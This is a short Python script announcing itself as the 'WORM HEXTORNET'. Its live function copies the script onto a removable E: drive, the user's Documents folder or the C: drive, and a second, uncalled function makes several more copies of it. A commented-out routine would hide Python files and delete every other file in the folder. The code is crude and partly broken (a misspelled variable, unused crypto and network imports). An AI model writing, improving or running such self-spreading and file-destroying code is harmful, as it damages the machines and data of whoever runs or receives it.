#!/usr/bin/env python

from shutil import copyfile
import os, getpass
from sys import argv
#import win32con, win32api
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
import os, random, sys, pkg_resources
from urllib2 import urlopen
import subprocess as sp
import shutil

"""
[==========================]
+                          +
+     WORM HEXTORNET       +
+                          +
[==========================]
"""

def propagate():
	#gets the current location of the worm
	src = os.path.abspath("hextornet.py")
	
	usr = getpass.getuser()
	
	if(os.path.isdir("E:\\")):
		dts = "E:" + "\\hextornet.py"
		print(dts)

	#checks for Documents folder in Linux
	elif(os.path.isdir("/home/" + usr + "/Documents/")):
		dst = "/home/" + usr + "/Documents/" + "hextornet.py"
	
	#checks for Documents folder in Windows
	elif(os.path.isdir("C:\\Users\\" + usr + "\\Documents")):
		dst = "C:\\Users\\" + usr + "\\Documents\\"+"hextornet.py"

	#checks for C:/ drive on windows
	elif(os.path.isdir("C:\\")):
		dst = "C:\\Users\\" + usr + "\\hextornet.py"

	else:
		dst = os.getcwd() + "hextornet.py"

	copyfile(src, dst)
	print("Worm location")
	print("dst:", dst)
	print("src:", src)

def copy():
	script = argv
	name = str(script[0])
	b = os.path.getsize(os.path.abspath("C:"))
	for i in range(0, 4):
		directoryName = "copy"+str(i)
		os.mkdir(directoryName)
		shutil.copy(name, directoryName)
		src = os.path.abspath(directoryName)

"""
def hide():
        for fname in os.listdir('.'):
                if fname.find('.py') == len(fname) - len('.py'):
                        #make the file hidden
                        win32api.SetFileAttributes(fname,win32con.FILE_ATTRIBUTE_HIDDEN)
                elif fname.find('.txt') == len(fname) - len('.txt'):
                        #make the file read only
                        win32api.SetFileAttributes(fname,win32con.FILE_ATTRIBUTE_READONLY)
                else:
                        #to force deletion of a file set it to normal
                        win32api.SetFileAttributes(fname, win32con.FILE_ATTRIBUTE_NORMAL)
			os.remove(fname)

"""

propagate()
